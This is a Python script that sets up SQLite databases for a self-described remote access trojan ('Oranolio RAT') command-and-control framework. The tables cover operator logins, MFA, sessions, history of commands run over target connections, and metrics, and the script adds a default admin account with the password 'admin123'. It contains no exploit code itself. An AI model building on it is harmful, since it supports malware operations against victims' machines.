#!/usr/bin/env python3
"""
Database Initialization Script
Automatically sets up all required databases for the Oranolio RAT - Elite C2 Framework
"""

import os
import sys
import sqlite3
import logging
from pathlib import Path
from datetime import datetime

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class DatabaseInitializer:
    """Handles initialization of all required databases"""
    
    def __init__(self, base_dir: str = None):
        self.base_dir = Path(base_dir) if base_dir else Path(__file__).parent
        self.data_dir = self.base_dir / "data"
        self.logs_dir = self.base_dir / "logs"
        
        # Ensure directories exist
        self.data_dir.mkdir(exist_ok=True)
        self.logs_dir.mkdir(exist_ok=True)
    
    def initialize_all_databases(self):
        """Initialize all required databases"""
        logger.info("Starting database initialization...")
        
        try:
            # Initialize email database
            self.initialize_email_database()
            
            # Initialize MFA database
            self.initialize_mfa_database()
            
            # Initialize webhook database
            self.initialize_webhook_database()
            
            # Initialize session database
            self.initialize_session_database()
            
            # Initialize command history database
            self.initialize_command_history_database()
            
            # Initialize metrics database
            self.initialize_metrics_database()
            
            # Initialize audit log database
            self.initialize_audit_log_database()
            
            logger.info("All databases initialized successfully!")
            return True
            
        except Exception as e:
            logger.error(f"Database initialization failed: {e}")
            return False
    
    def initialize_email_database(self):
        """Initialize email authentication database"""
        db_path = self.data_dir / "email_auth.db"
        logger.info(f"Initializing email database: {db_path}")
        
        with sqlite3.connect(db_path) as conn:
            cursor = conn.cursor()
            
            # Users table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS users (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    email TEXT UNIQUE NOT NULL,
                    password_hash TEXT NOT NULL,
                    salt TEXT NOT NULL,
                    is_verified BOOLEAN DEFAULT FALSE,
                    verification_token TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    last_login TIMESTAMP,
                    failed_login_attempts INTEGER DEFAULT 0,
                    locked_until TIMESTAMP,
                    is_active BOOLEAN DEFAULT TRUE
                )
            ''')
            
            # Email verification tokens
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS verification_tokens (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER NOT NULL,
                    token TEXT UNIQUE NOT NULL,
                    expires_at TIMESTAMP NOT NULL,
                    used BOOLEAN DEFAULT FALSE,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (user_id) REFERENCES users (id)
                )
            ''')
            
            # Password reset tokens
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS password_reset_tokens (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER NOT NULL,
                    token TEXT UNIQUE NOT NULL,
                    expires_at TIMESTAMP NOT NULL,
                    used BOOLEAN DEFAULT FALSE,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (user_id) REFERENCES users (id)
                )
            ''')
            
            # API keys
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS api_keys (
                    id TEXT PRIMARY KEY,
                    user_id INTEGER NOT NULL,
                    name TEXT NOT NULL,
                    key_hash TEXT NOT NULL,
                    permissions TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    last_used TIMESTAMP,
                    expires_at TIMESTAMP,
                    is_active BOOLEAN DEFAULT TRUE,
                    usage_count INTEGER DEFAULT 0,
                    FOREIGN KEY (user_id) REFERENCES users (id)
                )
            ''')
            
            # Create indexes
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_users_email ON users (email)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_verification_tokens_token ON verification_tokens (token)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_password_reset_tokens_token ON password_reset_tokens (token)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_api_keys_key_hash ON api_keys (key_hash)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_api_keys_user_id ON api_keys (user_id)')
            
            conn.commit()
            logger.info("Email database initialized successfully")
    
    def initialize_mfa_database(self):
        """Initialize MFA database"""
        db_path = self.data_dir / "mfa_auth.db"
        logger.info(f"Initializing MFA database: {db_path}")
        
        with sqlite3.connect(db_path) as conn:
            cursor = conn.cursor()
            
            # MFA settings for users
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS mfa_settings (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER NOT NULL,
                    secret_key TEXT NOT NULL,
                    backup_codes TEXT,
                    is_enabled BOOLEAN DEFAULT FALSE,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    last_used TIMESTAMP,
                    FOREIGN KEY (user_id) REFERENCES users (id)
                )
            ''')
            
            # MFA verification attempts
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS mfa_attempts (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER NOT NULL,
                    code TEXT NOT NULL,
                    success BOOLEAN NOT NULL,
                    ip_address TEXT,
                    user_agent TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (user_id) REFERENCES users (id)
                )
            ''')
            
            # Backup codes
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS backup_codes (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER NOT NULL,
                    code_hash TEXT NOT NULL,
                    used BOOLEAN DEFAULT FALSE,
                    used_at TIMESTAMP,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (user_id) REFERENCES users (id)
                )
            ''')
            
            # Create indexes
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_mfa_settings_user_id ON mfa_settings (user_id)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_mfa_attempts_user_id ON mfa_attempts (user_id)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_backup_codes_user_id ON backup_codes (user_id)')
            
            conn.commit()
            logger.info("MFA database initialized successfully")
    
    def initialize_webhook_database(self):
        """Initialize webhook authentication database"""
        db_path = self.data_dir / "webhook_auth.db"
        logger.info(f"Initializing webhook database: {db_path}")
        
        with sqlite3.connect(db_path) as conn:
            cursor = conn.cursor()
            
            # Webhook configurations
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS webhook_configs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    name TEXT UNIQUE NOT NULL,
                    url TEXT NOT NULL,
                    secret_key TEXT NOT NULL,
                    is_active BOOLEAN DEFAULT TRUE,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    last_used TIMESTAMP
                )
            ''')
            
            # Webhook authentication attempts
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS webhook_attempts (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    webhook_id INTEGER NOT NULL,
                    success BOOLEAN NOT NULL,
                    ip_address TEXT,
                    user_agent TEXT,
                    error_message TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (webhook_id) REFERENCES webhook_configs (id)
                )
            ''')
            
            # Create indexes
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_webhook_configs_name ON webhook_configs (name)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_webhook_attempts_webhook_id ON webhook_attempts (webhook_id)')
            
            conn.commit()
            logger.info("Webhook database initialized successfully")
    
    def initialize_session_database(self):
        """Initialize session management database"""
        db_path = self.data_dir / "sessions.db"
        logger.info(f"Initializing session database: {db_path}")
        
        with sqlite3.connect(db_path) as conn:
            cursor = conn.cursor()
            
            # Active sessions
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS sessions (
                    id TEXT PRIMARY KEY,
                    user_id INTEGER NOT NULL,
                    ip_address TEXT,
                    user_agent TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    last_activity TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    expires_at TIMESTAMP NOT NULL,
                    is_active BOOLEAN DEFAULT TRUE
                )
            ''')
            
            # Session activity log
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS session_activity (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    session_id TEXT NOT NULL,
                    action TEXT NOT NULL,
                    details TEXT,
                    ip_address TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (session_id) REFERENCES sessions (id)
                )
            ''')
            
            # Create indexes
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_sessions_user_id ON sessions (user_id)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_sessions_expires_at ON sessions (expires_at)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_session_activity_session_id ON session_activity (session_id)')
            
            conn.commit()
            logger.info("Session database initialized successfully")
    
    def initialize_command_history_database(self):
        """Initialize command history database"""
        db_path = self.data_dir / "command_history.db"
        logger.info(f"Initializing command history database: {db_path}")
        
        with sqlite3.connect(db_path) as conn:
            cursor = conn.cursor()
            
            # Command history
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS command_history (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    session_id TEXT NOT NULL,
                    user_id INTEGER,
                    command TEXT NOT NULL,
                    command_type TEXT,
                    target_connection TEXT,
                    success BOOLEAN NOT NULL,
                    output TEXT,
                    error_message TEXT,
                    execution_time REAL,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            # Command templates
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS command_templates (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    name TEXT UNIQUE NOT NULL,
                    command TEXT NOT NULL,
                    description TEXT,
                    category TEXT,
                    is_system BOOLEAN DEFAULT FALSE,
                    created_by INTEGER,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    last_used TIMESTAMP
                )
            ''')
            
            # Create indexes
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_command_history_session_id ON command_history (session_id)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_command_history_user_id ON command_history (user_id)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_command_history_created_at ON command_history (created_at)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_command_templates_name ON command_templates (name)')
            
            conn.commit()
            logger.info("Command history database initialized successfully")
    
    def initialize_metrics_database(self):
        """Initialize metrics and monitoring database"""
        db_path = self.data_dir / "metrics.db"
        logger.info(f"Initializing metrics database: {db_path}")
        
        with sqlite3.connect(db_path) as conn:
            cursor = conn.cursor()
            
            # System metrics
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS system_metrics (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    cpu_percent REAL,
                    memory_percent REAL,
                    disk_percent REAL,
                    network_bytes_sent INTEGER,
                    network_bytes_received INTEGER,
                    active_connections INTEGER,
                    commands_per_minute REAL,
                    errors_per_minute REAL
                )
            ''')
            
            # Command metrics
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS command_metrics (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    command TEXT NOT NULL,
                    execution_time REAL,
                    success BOOLEAN,
                    error_message TEXT,
                    user_id INTEGER,
                    session_id TEXT
                )
            ''')
            
            # Connection metrics
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS connection_metrics (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    connection_id TEXT NOT NULL,
                    client_ip TEXT,
                    bytes_transferred INTEGER,
                    commands_executed INTEGER,
                    duration_seconds REAL,
                    disconnected_at TIMESTAMP
                )
            ''')
            
            # Create indexes
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_system_metrics_timestamp ON system_metrics (timestamp)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_command_metrics_timestamp ON command_metrics (timestamp)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_command_metrics_command ON command_metrics (command)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_connection_metrics_timestamp ON connection_metrics (timestamp)')
            
            conn.commit()
            logger.info("Metrics database initialized successfully")
    
    def initialize_audit_log_database(self):
        """Initialize audit logging database"""
        db_path = self.data_dir / "audit_log.db"
        logger.info(f"Initializing audit log database: {db_path}")
        
        with sqlite3.connect(db_path) as conn:
            cursor = conn.cursor()
            
            # Audit log entries
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS audit_log (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    event_type TEXT NOT NULL,
                    user_id INTEGER,
                    session_id TEXT,
                    ip_address TEXT,
                    user_agent TEXT,
                    action TEXT NOT NULL,
                    details TEXT,
                    success BOOLEAN,
                    error_message TEXT
                )
            ''')
            
            # Security events
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS security_events (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    event_type TEXT NOT NULL,
                    severity TEXT NOT NULL,
                    user_id INTEGER,
                    ip_address TEXT,
                    description TEXT NOT NULL,
                    details TEXT,
                    resolved BOOLEAN DEFAULT FALSE,
                    resolved_at TIMESTAMP,
                    resolved_by INTEGER
                )
            ''')
            
            # Create indexes
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_audit_log_timestamp ON audit_log (timestamp)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_audit_log_event_type ON audit_log (event_type)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_audit_log_user_id ON audit_log (user_id)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_security_events_timestamp ON security_events (timestamp)')
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_security_events_severity ON security_events (severity)')
            
            conn.commit()
            logger.info("Audit log database initialized successfully")
    
    def create_default_admin_user(self):
        """Create a default admin user for initial setup"""
        email_db_path = self.data_dir / "email_auth.db"
        
        try:
            with sqlite3.connect(email_db_path) as conn:
                cursor = conn.cursor()
                
                # Check if admin user already exists
                cursor.execute("SELECT id FROM users WHERE email = ?", ("admin@oranolio.local",))
                if cursor.fetchone():
                    logger.info("Default admin user already exists")
                    return
                
                # Create admin user
                import hashlib
                import secrets
                
                password = "admin123"  # Should be changed in production
                salt = secrets.token_hex(32)
                password_hash = hashlib.pbkdf2_hmac('sha256', password.encode(), salt.encode(), 100000)
                
                cursor.execute('''
                    INSERT INTO users (email, password_hash, salt, is_verified, is_active)
                    VALUES (?, ?, ?, ?, ?)
                ''', (
                    "admin@oranolio.local",
                    password_hash.hex(),
                    salt,
                    True,
                    True
                ))
                
                conn.commit()
                logger.info("Default admin user created: admin@oranolio.local / admin123")
                logger.warning("IMPORTANT: Change the default admin password in production!")
                
        except Exception as e:
            logger.error(f"Error creating default admin user: {e}")
    
    def verify_databases(self):
        """Verify that all databases are properly initialized"""
        databases = [
            "email_auth.db",
            "mfa_auth.db", 
            "webhook_auth.db",
            "sessions.db",
            "command_history.db",
            "metrics.db",
            "audit_log.db"
        ]
        
        all_good = True
        for db_name in databases:
            db_path = self.data_dir / db_name
            if not db_path.exists():
                logger.error(f"Database missing: {db_name}")
                all_good = False
            else:
                logger.info(f"✓ {db_name} exists")
        
        return all_good

def main():
    """Main function to initialize databases"""
    logger.info("Oranolio RAT - Database Initialization")
    logger.info("=" * 50)
    
    initializer = DatabaseInitializer()
    
    # Initialize all databases
    if initializer.initialize_all_databases():
        # Create default admin user
        initializer.create_default_admin_user()
        
        # Verify databases
        if initializer.verify_databases():
            logger.info("Database initialization completed successfully!")
            logger.info("You can now start the Oranolio RAT system.")
        else:
            logger.error("Database verification failed!")
            sys.exit(1)
    else:
        logger.error("Database initialization failed!")
        sys.exit(1)

if __name__ == "__main__":
    main()